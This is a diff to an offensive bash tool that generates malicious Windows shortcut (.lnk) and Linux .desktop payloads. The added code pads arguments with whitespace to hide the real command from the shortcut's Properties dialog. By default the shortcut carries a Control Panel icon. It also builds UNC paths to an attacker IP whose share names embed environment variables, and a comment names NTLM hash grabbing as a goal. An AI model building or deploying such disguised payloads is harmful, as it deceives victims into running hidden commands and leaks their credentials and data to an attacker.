@@ -14,6 +14,7 @@ PAYLOAD=""
 COMMAND=""
 ARGUMENTS=""
 IP=""
+METHOD=""
 ENVIRONMENT=""
 SHARE=""
 NAME=""
@@ -23,13 +24,20 @@ WINDOW=""
 WORKINGDIRECTORY=""
 OUTPUT=""
 VERBOSE=0
+DEBUG=0
 VERSION=0
 
 function check_program() {
     type -P "${1}" 2>/dev/null
 }
 
-function print() {
+function _print() {
+    local text="${1}"
+
+    echo -ne "${text}"
+}
+
+function println() {
     local text="${1}"
 
     echo -e "${text}"
@@ -39,21 +47,21 @@ function info() {
     local message="${1}"
     local color="${BLUE}[*]${RESET}"
 
-    print "${color} ${message}"
+    println "${color} ${message}"
 }
 
 function fin() {
     local message="${1}"
     local color="${GREEN}[*]${RESET}"
 
-    print "${color} ${message}"
+    println "${color} ${message}"
 }
 
 function error() {
     local message="${1}"
     local color="${RED}[*]${RESET}"
 
-    print "${color} ${message}"
+    println "${color} ${message}"
 }
 
 function quit() {
@@ -113,235 +121,359 @@ function random_string() {
     echo "${string}"
 }
 
-function generate() {
-    local payload="${1}"
+: <<-'TODO'
+\x09 -> Horizontal tab (\t)
+\x0A -> Line Feed (\n)
+\x0B -> Vertical tab
+\x0C -> Form Feed
+\x0D -> Carriage Return
+TODO
+function fill_padding() {
+    local target_executable="${1}"
+    local arguments_string="${2}"
+    local method="${3}"
+
+    function spaces() {
+        local mode="${1}"
+        local boundary # Target dialog box's boundary
+        local output=""
+        local whitespaces
+
+        # Contain arguments inside the box's boundary but will be inspected through properties
+        if [[ "${mode}" == "visible" ]]
+        then
+            boundary=44
+        elif [[ "${mode}" == "invisible" ]] # Push arguments outside the box's boundary and it won't be inspected through properties
+        then
+            boundary=260
+        fi
+
+        # If the first argument is already close to or exceeds the boundary,
+        # we need minimal spacing
+        if ((${#target_executable} >= boundary))
+        then
+            # First argument already fills most/all visible space
+            whitespaces=1
+        else
+            # Calculate whitespace needed to push second argument beyond visible boundary
+            # We want the second argument to start after the visible area
+            whitespaces=$((boundary - ${#target_executable} + 1))
+        fi
+
+        # Generate the whitespace padding
+        local padding=""
+        for ((i = 0; i < whitespaces; i++))
+        do
+            padding+=" "
+        done
+
+        # Construct the final output
+        output="${padding}${arguments_string}"
+
+        println "${output}"
+    }
+
+    case "${method}" in
+        "vspaces")
+            spaces "visible"
+            ;;
+        "ispaces")
+            spaces "invisible"
+            ;;
+        esac
+}
+
+function shell_link() {
     local command="${COMMAND//\\/\\\\}"
     local arguments="${ARGUMENTS//\\/\\\\}"
     local name="${NAME//\\/\\\\}"
     local description="${DESCRIPTION//\\/\\\\}"
-    local -a execute=()
+    local unc_path_pattern="^\\\\"
+    local drive_pattern="^([[:alpha:]]:)([/\\\\]?.*|$)"
+    local -A windowstyle=(
+        [normal]=1
+        [maximized]=3
+        [minimized]=7
+    )
+    local -a execute=("WINEDEBUG=-all" "WINEARCH=win64"
+            "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")
+    local temp
+    local temporary_file
+    local script
 
-    function shell_link() {
-        local -A windowstyle=(
-            [normal]=1
-            [maximized]=3
-            [minimized]=7
-        )
-        local unc_path_pattern="^\\\\"
-        local drive_pattern="^([[:alpha:]]:)([/\\\\]?.*|$)"
-        local temp
-        local temporary_file
-        local script
-        execute=("WINEDEBUG=-all" "WINEARCH=win64"
-                "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")
+    script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
+    script+="\$ShortcutPath = \"${OUTPUT}\"\n"
+    script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"
 
-        script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
-        script+="\$ShortcutPath = \"${OUTPUT}\"\n"
-        script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"
+    if [[ -n "${command}" ]]
+    then
+        if [[ "${command}" =~ ${unc_path_pattern} ]] # Checks for UNC path
+        then
+            error "Wine has limitation for TargetPath when specifying a UNC path."
+            info "Specify the IP address (-i) instead."
+            quit 1
+        elif [[ "${command}" =~ ${drive_pattern} ]] # Checks the drive letter letter
+        then
+            if [[ -z "${arguments}" ]]
+            then
+                error "Command and arguments must be passed!"
+                quit 1
+            fi
+        else
+            error "Invalid drive letter!"
+            println "TargetPath: '${command}'"
+            quit 1
+        fi
+    elif [[ -n "${IP}" ]] # Checks if IP is passed if command is not passed
+    then
+        local unc
+        if [[ -z "${SHARE}" ]]
+        then
+            SHARE="$(random_string)"
+            if [[ -n "${ENVIRONMENT}" ]]
+            then
+                while IFS="," read -ra variables
+                do
+                    for variable in "${variables[@]}"
+                    do
+                        temp+="%${variable}%,"
+                    done
+                done <<< "${ENVIRONMENT}"
+                # Remove trailing comma
+                ENVIRONMENT="${temp%,}"
+                SHARE="${SHARE}_${ENVIRONMENT}"
+            fi
+
+            if [[ -z "${NAME}" ]]
+            then
+                unc="\\\\\\${IP}\\\\${SHARE}"
+            elif [[ -n "${NAME}" ]]
+            then
+                unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
+            fi
+        elif [[ -n "${SHARE}" ]]
+        then
+            if [[ -z "${NAME}" ]]
+            then
+                unc="\\\\\\${IP}\\\\${SHARE}"
+            elif [[ -n "${NAME}" ]]
+            then
+                unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
+            fi
+        fi
+
+        # Escape the escape character (\e)
+        command="C:\\Windows\\\\explorer.exe"
+        arguments="/root,\"\\${unc}\""
+    else
+        error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
+        quit 1
+    fi
+    # TODO: test it just to be sure including NTLM hash grab
+    # TODO: Test the spaces method
+
+    if [[ -n "${METHOD}" ]]
+    then
+        if [[ "${METHOD}" == "vspaces" ]]
+        then
+            arguments=$(fill_padding "${command}" "${arguments}" "${METHOD}")
+        elif [[ "${METHOD}" == "ispaces" ]]
+        then
+            arguments=$(fill_padding "${command}" "${arguments}" "${METHOD}")
+        else
+            error "Available methods are: 'vspaces' and 'ispaces"
+        fi
+    fi
+
+    # Literally a feature in Windows
+    # so better thanks Microsoft user ;)
+    if (("${#arguments}" >= 4096))
+    then
+        error "Arguments must not exceed more than 4096 characters"
+        quit 1
+    else
+        script+="\$Shortcut.TargetPath = \"${command}\"\n"
+        script+="\$Shortcut.Arguments = \"${arguments}\"\n"
+    fi
+
+    if [[ -n "${description}" ]]
+    then
+        script+="\$Shortcut.Description = \"${description}\""
+    fi
+
+    # Using a custom index icon
+    if [[ -n "${ICON}" ]]
+    then
+        script+="\$Shortcut.IconLocation = '${ICON}'\n"
+    elif [[ -z "${ICON}" ]] # Will set to control panel icon by default
+    then
+        script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
+    fi
+
+    if [[ -n "${WINDOW}" ]]
+    then
+        if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
+        then
+            error "Invalid window style: ${WINDOW}"
+            quit 1
+        fi
+        script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
+    fi
+
+    if [[ -n "${WORKINGDIRECTORY}" ]]
+    then
+        script+="\$Shortcut.WorkingDirectory = '${WORKINGDIRECTORY}'\n"
+    fi
+
+    script+="\$Shortcut.Save()\n"
+
+    # Save the temporary PowerShell script then remove it after generation
+    temporary_file=$(mktemp --suffix '.ps1')
+    echo -e "${script}" > "${temporary_file}"
+
+    if ((DEBUG == 1))
+    then
+        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file}"
+    else
+        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+    fi
+    # TODO: Test it to ensure the error occurs
+    if [[ ! -f "${OUTPUT}" ]]
+    then
+        error "Something went wrong with the payload generation!"
+        quit 1
+    fi
+
+    fin "Payload has been generated!"
+    if ((VERBOSE == 1))
+    then
+        [[ -n "${command}" ]] && println "TargetPath: ${command}"
+        [[ -n "${arguments}" ]] && println "Arguments: ${arguments}"
+        [[ -n "${IP}" ]] && println "IP Address/Computer Name: ${IP}"
+        [[ -n "${SHARE}" ]] && println "Share name: ${SHARE}"
+        [[ -n "${description}" ]] && println "Description: ${description}"
+        [[ -n "${ICON}" ]] && println "Icon: ${ICON}"
+        [[ -n "${WINDOW}" ]] && println "WindowStyle: ${WINDOW}"
+        [[ -n "${WORKINGDIRECTORY}" ]] && println "Working Directory: ${WORKINGDIRECTORY}"
+    fi
+
+    [[ -f "${temporary_file}" ]] && rm -f "${temporary_file}"
+}
+
+function desktop_entry() {
+    local command="${COMMAND//\\/\\\\}"
+    local arguments="${ARGUMENTS//\\/\\\\}"
+    local name="${NAME//\\/\\\\}"
+    local description="${DESCRIPTION//\\/\\\\}"
+    local -a execute=("desktop-file-edit")
+
+    if [[ -n "${name}" ]]
+    then
+        execute+=("--set-key='Encoding'")
+        execute+=("--set-value='UTF-8'")
+        execute+=("--set-key='Name'")
+        execute+=("--set-value='${name}'")
+        execute+=("--set-key='Version'")
+        execute+=("--set-value='1.0'")
+    else
+        error "Name must be passed!"
+        quit 1
+    fi
+
+    if [[ -n "${METHOD}" ]]
+    then
+        error "No available methods for desktop entry!"
+        quit 1
+    fi
+
+    if [[ -n "${command}" && -n "${arguments}" ]]
+    then
+        if (("${#arguments}" >= 2090326))
+        then
+            error "Arguments must not exceed more than 2090326 characters"
+            quit 1
+        fi
+        execute+=("--set-key='Exec'")
+        execute+=("--set-value='${command} ${arguments}'")
+    elif [[ -n "${command}" ]]
+    then
+        execute+=("--set-key='Exec'")
+        execute+=("--set-value='${command}'")
+    else
+        error "At least command and/or arguments must be passed!"
+        quit 1
+    fi
+
+    if [[ -n "${description}" ]]
+    then
+        execute+=("--set-comment='${description}'")
+    fi
+
+    if [[ -n "${WORKINGDIRECTORY}" ]]
+    then
+        execute+=("--set-key='Path'")
+        execute+=("--set-value='${WORKINGDIRECTORY}'")
+    fi
+
+    if [[ -n "${ICON}" ]]
+    then
+        execute+=("--set-icon='${ICON}'")
+    fi
+
+    if [[ -z "${WINDOW}" ]]
+    then
+        execute+=("--set-key=\"Terminal\"")
+        execute+=("--set-value=\"false\"")
+    elif [[ -n "${WINDOW}" ]] # Make the application run in terminal if set to true otherwise false
+    then
+        if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
+        then
+            execute+=("--set-key=\"Terminal\"")
+            execute+=("--set-value=\"${WINDOW}\"")
+        else
+            error "The Terminal must be set either 'true' or 'false'!"
+        fi
+    fi
+    execute+=("--set-key=\"Type\"")
+    execute+=("--set-value=\"Application\"")
+    # Do not appear in application menu
+    execute+=("--set-key=\"NoDisplay\"")
+    execute+=("--set-value=\"true\"")
+    # The desktop entry must be usable and not hidden
+    execute+=("--set-key=\"Hidden\"")
+    execute+=("--set-value=\"false\"")
+    execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
+    touch "${OUTPUT}"
+
+    if ((DEBUG == 1))
+    then
+        eval "${execute[*]} ${OUTPUT}"
+    else
+        eval "${execute[*]} ${OUTPUT} &>/dev/null"
+    fi
+
+    fin "Payload has been generated!"
+    if ((VERBOSE == 1))
+    then
+        [[ -n "${NAME}" ]] && println "Name: ${NAME}"
 
         if [[ -n "${command}" ]]
         then
-            if [[ "${command}" =~ ${unc_path_pattern} ]]
-            then
-                error "Wine has limitation for TargetPath when specifying a UNC path."
-                info "Specify the IP address (-i) instead."
-                quit 1
-            elif [[ "${command}" =~ ${drive_pattern} ]] # Checks the drive letter letter
-            then
-                if [[ -n "${arguments}" && "${#arguments}" -lt 260 ]]
-                then
-                    script+="\$Shortcut.TargetPath = '${command}'\n"
-                    script+="\$Shortcut.Arguments = '${arguments}'\n"
-                elif (("${#arguments}" >= 260))
-                then
-                    error "Arguments must not exceed more than 260 characters"
-                    quit 1
-                elif [[ -z "${arguments}" ]]
-                then
-                    error "Command and arguments must be passed!"
-                    quit 1
-                fi
-            else
-                error "Invalid drive letter!"
-                print "TargetPath: '${command}'"
-                quit 1
-            fi
-        elif [[ -n "${IP}" ]] # Checks if IP is passed if command is not passed
+            println "Exec: ${command}"
+        elif [[ -n "${command}" && -n "${arguments}" ]]
         then
-            local unc
-            if [[ -z "${SHARE}" ]]
-            then
-                SHARE="$(random_string)"
-                if [[ -n "${ENVIRONMENT}" ]]
-                then
-                    while IFS="," read -ra variables
-                    do
-                        for variable in "${variables[@]}"
-                        do
-                            temp+="%${variable}%,"
-                        done
-                    done <<< "${ENVIRONMENT}"
-                    # Remove trailing comma
-                    ENVIRONMENT="${temp%,}"
-                    SHARE="${SHARE}_${ENVIRONMENT}"
-                fi
-
-                if [[ -z "${NAME}" ]]
-                then
-                    unc="\\\\\\${IP}\\\\${SHARE}"
-                elif [[ -n "${NAME}" ]]
-                then
-                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
-                fi
-            elif [[ -n "${SHARE}" ]]
-            then
-                if [[ -z "${NAME}" ]]
-                then
-                    unc="\\\\\\${IP}\\\\${SHARE}"
-                elif [[ -n "${NAME}" ]]
-                then
-                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
-                fi
-            fi
-
-            # Escape the escape character (\e)
-            script+="\$Shortcut.TargetPath = 'C:\\Windows\\\\explorer.exe'\n"
-            script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
-        else
-            error "You must provide either -c (command) or -i (IP) for 'lnk' payload."
-            quit 1
+            println "Exec: ${command} ${arguments}"
         fi
 
-        if [[ -n "${description}" ]]
-        then
-            script+="\$Shortcut.Description = \"${description}\""
-        fi
+        [[ -n "${description}" ]] && println "Comment: ${description}"
+        [[ -n "${ICON}" ]] && println "Icon: ${ICON}"
+        [[ -n "${WINDOW}" ]] && println "Terminal: ${WINDOW}"
+        [[ -n "${WORKINGDIRECTORY}" ]] && println "Path: ${WORKINGDIRECTORY}"
+    fi
+}
 
-        # Using a custom index icon
-        if [[ -n "${ICON}" ]]
-        then
-            script+="\$Shortcut.IconLocation = '${ICON}'\n"
-        elif [[ -z "${ICON}" ]] # Will set to control panel icon by default
-        then
-            script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
-        fi
-
-        if [[ -n "${WINDOW}" ]]
-        then
-            if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
-            then
-                error "Invalid window style: ${WINDOW}"
-                quit 1
-            fi
-            script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
-        fi
-
-        if [[ -n "${WORKINGDIRECTORY}" ]]
-        then
-            script+="\$Shortcut.WorkingDirectory = '${WORKINGDIRECTORY}'\n"
-        fi
-
-        script+="\$Shortcut.Save()\n"
-
-        # Save the temporary PowerShell script then remove it after generation
-        temporary_file=$(mktemp --suffix '.ps1')
-        echo -e "${script}" > "${temporary_file}"
-
-        if ((VERBOSE == 1))
-        then
-            eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file}"
-        else
-            eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
-        fi
-
-        rm -f "${temporary_file}"
-
-        fin "Payload has been generated!"
-    }
-
-    function desktop_entry() {
-        execute=("desktop-file-edit")
-
-        if [[ -n "${name}" ]]
-        then
-            execute+=("--set-key='Encoding'")
-            execute+=("--set-value='UTF-8'")
-            execute+=("--set-key='Name'")
-            execute+=("--set-value='${name}'")
-            execute+=("--set-key='Version'")
-            execute+=("--set-value='1.0'")
-        else
-            error "Name must be passed!"
-            quit 1
-        fi
-
-        if [[ -n "${command}" && -n "${arguments}" ]]
-        then
-            if (("${#arguments}" >= 2090326))
-            then
-                error "Arguments must not exceed more than 2090326 characters"
-                quit 1
-            fi
-            execute+=("--set-key='Exec'")
-            execute+=("--set-value='${command} ${arguments}'")
-        elif [[ -n "${command}" ]]
-        then
-            execute+=("--set-key='Exec'")
-            execute+=("--set-value='${command}'")
-        else
-            error "At least command and/or arguments must be passed!"
-            quit 1
-        fi
-
-        if [[ -n "${description}" ]]
-        then
-            execute+=("--set-comment='${description}'")
-        fi
-
-        if [[ -n "${WORKINGDIRECTORY}" ]]
-        then
-            execute+=("--set-key='Path'")
-            execute+=("--set-value='${WORKINGDIRECTORY}'")
-        fi
-
-        if [[ -n "${ICON}" ]]
-        then
-            execute+=("--set-icon='${ICON}'")
-        fi
-
-        if [[ -z "${WINDOW}" ]]
-        then
-            execute+=("--set-key=\"Terminal\"")
-            execute+=("--set-value=\"false\"")
-        elif [[ -n "${WINDOW}" ]] # Make the application run in terminal if set to true otherwise false
-        then
-            if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
-            then
-                execute+=("--set-key=\"Terminal\"")
-                execute+=("--set-value=\"${WINDOW}\"")
-            else
-                error "The Terminal must be set either 'true' or 'false'!"
-            fi
-        fi
-        execute+=("--set-key=\"Type\"")
-        execute+=("--set-value=\"Application\"")
-        # Do not appear in application menu
-        execute+=("--set-key=\"NoDisplay\"")
-        execute+=("--set-value=\"true\"")
-        # The desktop entry must be usable and not hidden
-        execute+=("--set-key=\"Hidden\"")
-        execute+=("--set-value=\"false\"")
-        execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
-        touch "${OUTPUT}"
-
-        if ((VERBOSE == 1))
-        then
-            eval "${execute[*]} ${OUTPUT}"
-        else
-            eval "${execute[*]} ${OUTPUT} &>/dev/null"
-        fi
-        fin "Payload has been generated!"
-    }
+function generate() {
+    local payload="${1}"
 
     if [[ -f "${OUTPUT}" ]]
     then
@@ -361,10 +493,10 @@ function generate() {
             ;;
         esac
 }
-
+# TODO: Check with C# PInvoke that could generate it with a Hotkey -H, --hotkey
 # I need to tell the user how to fucking use me
 function usage() {
-    print "Usage: $(basename "${0}") <flags>
+    println "Usage: $(basename "${0}") <flags>
     -p, --payload                       Specify a payload module ('lnk', 'desktop').
     -c, --command                       Specify a command to execute.
     -a, --arguments                     Optionally pass the arguments (except it is
@@ -373,6 +505,8 @@ function usage() {
                                         'lnk' payload module).
     -e, --environment                   Optionally pass the environment variables to
                                         exfiltrate.
+    -m, --method                        Specify the method. Available options for 'lnk'
+                                        payload module: 'spaces'.
     -s, --share                         Specify an SMB share (applies with -h flag
                                         when it's optional for 'lnk' payload module).
     -n, --name                          Specify a name. It is optional when 'lnk' is specified.
@@ -386,11 +520,11 @@ function usage() {
                                         and 'minimized'. For 'desktop' payload it is set to
                                         'false', the available options are: 'true' and 'false'.
     -wd, --workingdirectory             Specify a working directory.
+    -v, --verbose                       Display more output information.
+    -D, --debug                         Debug the payload generation.
     -o, --output                        Specify an output.
-    -v, --verbose                       Display more information.
     -V, --version                       Display the program's version number.
     -h, --help                          Display the help menu."
-
     quit 0
 }
 
@@ -416,6 +550,10 @@ function main() {
                 ;;
             -a | --arguments)
                 ARGUMENTS="${2}"
+                shift 2
+                ;;
+            -m | --method)
+                METHOD="${2,,}"
                 shift 2
                 ;;
             -i | --ip)
@@ -450,13 +588,17 @@ function main() {
                 WORKINGDIRECTORY="${2}"
                 shift 2
                 ;;
-            -o | --output)
-                OUTPUT="${2}"
-                shift 2
-                ;;
             -v | --verbose)
                 VERBOSE=1
                 shift
+                ;;
+            -D | --debug)
+                DEBUG=1
+                shift
+                ;;
+            -o | --output)
+                OUTPUT="${2}"
+                shift 2
                 ;;
             -V | --version)
                 VERSION=1
